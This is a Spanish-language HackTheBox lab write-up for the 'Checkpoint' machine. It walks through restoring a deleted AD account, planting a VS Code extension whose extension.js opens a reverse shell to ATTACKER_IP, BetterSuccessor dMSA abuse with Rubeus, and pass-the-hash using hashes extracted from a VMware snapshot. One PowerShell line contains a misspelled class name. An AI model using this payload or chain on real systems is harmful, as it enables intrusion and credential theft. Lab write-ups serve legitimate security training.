Write-up: Checkpoint (HackTheBox)

Dificultad: Media | Plataforma: HackTheBox

Objetivos: Reanimación de objetos eliminados en la Papelera de reciclaje de AD, supply chain attack mediante extensión de VS Code, escalada de privilegios con dMSA (BetterSuccessor) y extracción de credenciales desde un snapshot de memoria de VMware.

1. Reconocimiento Inicial (Nmap)

Comenzamos descubriendo todos los puertos abiertos en la máquina objetivo: 

ports=$(nmap -p- --min-rate=10000 -T4 -Pn 10.129.85.252 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV -Pn 10.129.85.252

La combinación de DNS (53), Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985) y ADWS (9389) es la huella característica de un Controlador de Dominio. El escaneo identifica el host como DC01 y el dominio como checkpoint.htb. 

echo "10.129.85.252 checkpoint.htb dc01.checkpoint.htb DC01" | sudo tee -a /etc/hosts

2. Enumeración SMB

Esta máquina sigue un escenario de assumed breach, por lo que partimos de credenciales de dominio con bajos privilegios. El primer paso es enumerar los recursos compartidos accesibles: 

netexec smb checkpoint.htb -u alex.turner -p 'REDACTED' --shares

Destacan dos recursos no estándar: DevDrop (lectura), descrito como zona de entrega para extensiones .vsix de VS Code con engine 1.118.0, y VMBackups, visible pero sin permisos de acceso.

3. Papelera de Reciclaje de AD: Reanimación de Tombstone

Usando bloodyAD mapeamos todos los objetos del directorio sobre los que nuestro usuario tiene permisos de escritura. Varios objetivos pertenecen a CN=Deleted Objects, incluyendo una cuenta eliminada (mark.davies) cuyo último contenedor conocido es la OU Employees, donde tenemos CreateChild. 

bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'REDACTED' get writable

Los objetos eliminados están ocultos en búsquedas LDAP normales. Los enumeramos con el control Show Deleted Objects (OID 1.2.840.113556.1.4.417): 

bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'REDACTED' \
  get search --base 'CN=Deleted Objects,DC=checkpoint,DC=htb' \
  --filter '(isDeleted=TRUE)' \
  --attr sAMAccountName,lastKnownParent,msDS-LastKnownRDN \
  -c 1.2.840.113556.1.4.417 -c 1.2.840.113556.1.4.2065

Con escritura sobre el objeto eliminado y CreateChild en la OU de destino, reanimamos la cuenta: 

bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'REDACTED' \
  set restore 'mark.davies'

4. Acceso Inicial: Supply Chain Attack con Extensión de VS Code

La cuenta restaurada reutiliza su contraseña anterior, y con ella obtenemos acceso de escritura sobre DevDrop. Una extensión de VS Code es simplemente un archivo .vsix (ZIP) con un manifiesto y JavaScript plano que el editor ejecuta en su propio proceso sin ningún sandbox.

Estructura de la extensión

beautify/
├── [Content_Types].xml      # OPC MIME-type map
├── extension.vsixmanifest   # VSIX package manifest
└── extension/
    ├── package.json         # extension manifest (VS Code)
    └── extension.js         # payload

El evento de activación onStartupFinished se dispara en cuanto el editor termina de cargar, sin interacción del usuario. El payload abre un socket TCP, lanza cmd.exe y enruta la entrada/salida sobre él: 

// extension.js (fragmento)
const net = require("net");
const cp  = require("child_process");

function activate(context) {
  const client = new net.Socket();
  const sh = cp.spawn("cmd.exe", []);
  client.connect(9090, "ATTACKER_IP", function () {
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  client.on("error", () => setTimeout(() => activate(context), 5000));
}
module.exports = { activate, deactivate: () => {} };

Empaquetamos la extensión y la subimos al share mientras un listener Netcat espera en el puerto 9090. Una tarea programada en el host instala y lanza la extensión, devolviendo una shell como el usuario ryan.brooks: 

zip -r beautify.vsix '[Content_Types].xml' extension.vsixmanifest extension/
nc -lvnp 9090
smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb/mark.davies%REDACTED' \
  -c 'put beautify.vsix beautify.vsix'

5. Movimiento Lateral: BetterSuccessor (Escalada con dMSA)

Con la shell como ryan.brooks, enumeramos nuestros permisos en AD y encontramos dos derechos clave: CreateChild sobre la OU DMSAHolder y GenericWrite sobre la cuenta de servicio svc_deploy. 

Import-Module ActiveDirectory
$acl = Get-Acl "AD:\OU=DMSAHolder,DC=checkpoint,DC=htb"
$acl.Access | Where-Object {$_.IdentityReference -like "*ryan*"} | Select IdentityReference,ActiveDirectoryRights

$acl2 = Get-Acl "AD:\CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
$acl2.Access | Where-Object {$_.IdentityReference -like "*ryan*"} | Select IdentityReference,ActiveDirectoryRights

Sobre la técnica BetterSuccessor

Windows Server 2025 introdujo las Delegated Managed Service Accounts (dMSA). El ataque original BadSuccessor permitía a cualquiera con CreateChild sobre una OU apuntar el atributo msDS-ManagedAccountPrecededByLink de un dMSA hacia cualquier cuenta privilegiada y recibir un ticket Kerberos con sus privilegios. Microsoft lo parcheó en agosto de 2025 exigiendo un enlace mutuo. BetterSuccessor es la variante post-parche: si el atacante también tiene escritura sobre la cuenta predecesora, puede establecer él mismo el enlace inverso, satisfaciendo la validación del KDC.

Creación y armado del dMSA

.\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:svc_backup

Como Set-ADObject y System.DirectoryServices no persisten estos atributos de forma fiable, usamos una ModifyRequest LDAP cruda con System.DirectoryServices.Protocols para escribir el enlace mutuo en svc_deploy: 

Add-Type -AssemblyName "System.DirectoryServices.Protocols"
$ldap = New-Object System.DirectoryServices.Protocols.LdapConnection("DC01.checkpoint.htb")
$ldap.AuthType = "Negotiate"; $ldap.Bind()

$dmsa   = "CN=svc_backup,OU=DMSAHolder,DC=checkpoint,DC=htb"
$target = "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
$mod    = New-Object System.DirectoryServices.Protocols.ModifyRequest
$mod.DistinguishedName = $target

$m1 = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
$m1.Name = "msDS-SupersededManagedAccountLink"; $m1.Operation = "Replace"; $null = $m1.Add($dmsa)

$m2 = New-Object System.DirecticsoryServices.Protocols.DirectoryAttributeModification
$m2.Name = "msDS-SupersededServiceAccountState"; $m2.Operation = "Replace"; $null = $m2.Add("2")

$null = $mod.Modifications.Add($m1); $null = $mod.Modifications.Add($m2)
$ldap.SendRequest($mod).ResultCode

Con el emparejamiento mutuo establecido, pedimos un TGT delegado para la sesión actual y luego solicitamos un TGS para el dMSA: 

.\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe asktgs /targetuser:svc_backup$ /service:krbtgt/CHECKPOINT.HTB /opsec /dmsa /nowrap /ticket:<TGT_ryan_brooks>

El ticket resultante lleva los grupos de pertenencia de svc_deploy. Lo convertimos y abrimos una sesión WinRM como el dMSA: 

echo '<BASE64_TICKET>' | base64 -d > svc_backup.kirbi
impacket-ticketConverter svc_backup.kirbi svc_backup.ccache
export KRB5CCNAME=$(pwd)/svc_backup.ccache
sudo ntpdate dc01.checkpoint.htb
evil-winrm -i DC01.checkpoint.htb -r CHECKPOINT.HTB

6. Escalada de Privilegios: Extracción de Credenciales desde Snapshot de VMware

Con el contexto de svc_deploy, podemos leer el share VMBackups. Contiene un snapshot de VMware (.vmem + .vmsn) de un Windows Server 2019 descomisionado, tomado con la VM encendida. Esto equivale a una copia completa de la RAM del guest, incluyendo las credenciales cacheadas de LSASS. Las protecciones como PPL o Credential Guard no sirven aquí: se está leyendo un archivo, no un proceso vivo. 

upload vmkatz.exe
.\vmkatz.exe 'C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn'

La herramienta extrae el hash NT del Administrador local del servidor retirado. Dado el patrón de reutilización de contraseñas ya observado en el entorno, lo probamos contra el Controlador de Dominio con Pass-the-Hash: 

netexec smb checkpoint.htb -u Administrator -H <HASH_REDACTED>
evil-winrm -i DC01.checkpoint.htb -u Administrator -H <HASH_REDACTED>

El hash es válido contra el Controlador de Dominio. ¡Dominio completamente comprometido!

Resumen de técnicas

  • Abuso de la Papelera de reciclaje de AD para reanimar objetos eliminados
  • Supply chain attack mediante extensión de VS Code (.vsix)
  • Escalada de privilegios con dMSA — BetterSuccessor (variante post-parche de BadSuccessor)
  • Extracción de credenciales desde un snapshot de memoria de VMware en caliente
  • Pass-the-Hash para acceder como Domain Admin
